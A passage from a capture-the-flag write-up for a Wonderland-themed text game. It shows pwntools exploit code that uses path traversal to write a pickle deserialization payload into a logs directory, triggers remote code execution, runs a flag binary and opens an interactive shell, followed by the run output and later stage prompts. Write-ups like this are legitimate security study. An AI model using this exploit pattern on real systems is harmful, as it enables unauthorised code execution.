[logs] $ blowsmoke amon2 %41%42%43%44
Smoke bellows from the lips of amon2 to form the words, "%41%42%43%44."
Curling and curling...
The words float up high into the air and eventually disappate.
[logs] $ read logs-amon2
You read the writing on the note:
ABCD
[logs] $
```

The exploit so far remains the same as in stage 1 but we need to include retrieving the
`golden-hookah.`

```python
    # Teleport to the location of the golden-hookah.
    log.info('Teleporting to under-a-giant-mushroom to get the golden-hookah...')
    mushroom = ('sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-'
                'the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom')
    c.sendline('teleport ' + mushroom)
    c.get(b'golden-hookah')
```

Next, we need to teleport to the `/opt/wonderlands/logs` directory, generate the Python pickle
payload with the bypass, encode where appropriate, and trigger the write.

```python
    # Teleport to /opt/wonderland/logs/
    log.info('Teleporting to /opt/wonderland/logs')
    c.sendline(b'teleport ../../../../../../opt/wonderland/logs')
    c.get_until_prompt()

    # Generate the payload and write an item to the logs directory.
    log.info('Generating pickle RCE payload...')
    payload = quote(pickle.dumps(Exploit()), safe='').encode('ascii')
    random_filename = str(uuid.uuid4()).encode('ascii')
    log.info('Writing payload to {}.item'.format(random_filename.decode('ascii')))
    c.sendline(b'blowsmoke ' + random_filename + b'.item ' + payload)
    c.get_until_prompt()
```

Finally, we can trigger the deserialization and get a `/bin/sh` shell using a 'get' command. We can
automate the execution of the SUID flag binary as well to obtain the flag. For further exploration,
we drop into an interactive session.

```python
    # Trigger the RCE.
    log.info('Triggering RCE...')
    c.sendline(b'get logs-' + random_filename)
    c.get_until_prompt()
    c.get_until_prompt()

    # Get the flag.
    log.info('Getting the flag by executing /home/rabbit/flag2.bin')
    log.success('Flag 2:')
    c.sendline('/home/rabbit/flag2.bin')
    c.sendline('echo END_OF_FLAG')
    log.success(c.recvuntil(b'END_OF_FLAG').replace(b'END_OF_FLAG', b''))

    # Drop into an interactive shell.
    log.success('Enjoy your shell!')
    c.interactive()
```

Running the exploit:

```shell
root@f3c66932cfee:/opt/wonderland# ./2_insecure_dill_loads.py
[+] Opening connection to 172.17.0.1 on port 31337: Done
[↘] Initialising connection. This will take a moment...
[*] Moving to the a-shallow-deadend to get the pocket-watch...
[*] Disabling text scroll.
[*] Moving to a-curious-hall to drink the pink-bottle...
[*] Moving to a-fancy-pavillion to eat the fluffy-cake...
[*] Moving to a-mystical-cove to get the looking-glass...
[*] Teleporting to under-a-giant-mushroom to get the golden-hookah...
[*] Teleporting to /opt/wonderland/logs
[*] Generating pickle RCE payload...
[*] Writing payload to 13c0671d-1f84-4ae4-a22f-002f8be16899.item
[*] Triggering RCE...
[*] Getting the flag by executing /home/rabbit/flag2.bin
[+] Flag 2:
[+] TISC{flag2}

[+] Enjoy your shell!
[*] Switching to interactive mode

$ id
uid=1000(rabbit) gid=1000(rabbit) groups=1000(rabbit)
$
```

The full exploit can be found in `2_insecure_dill_loads.py`.


### Stage 3: Advice from a Caterpillar

The challenge text for this stage is:

```
The flowers said that the French Mouse was invited. But to what? Perhaps she hid the invitation in
her warren. It is said that her home is decorated with all sorts of oddly shaped mirrors but the
tragic thing is that she's afraid of her own reflection.

The game is hosted at `172.17.0.1:31337`.
```


### Stage 4: A Mad Tea Party

The challenge text for this stage is:

```
Attend the Mad Tea Party but come back with (what's in) the Hatter's head. Sometimes the end of a
tale might not be the end of the story. Things that don't make logical sense can safely be ignored.
Do not eat that tiny Hello Kitty.

The game is hosted at `172.17.0.1:31337`.
```


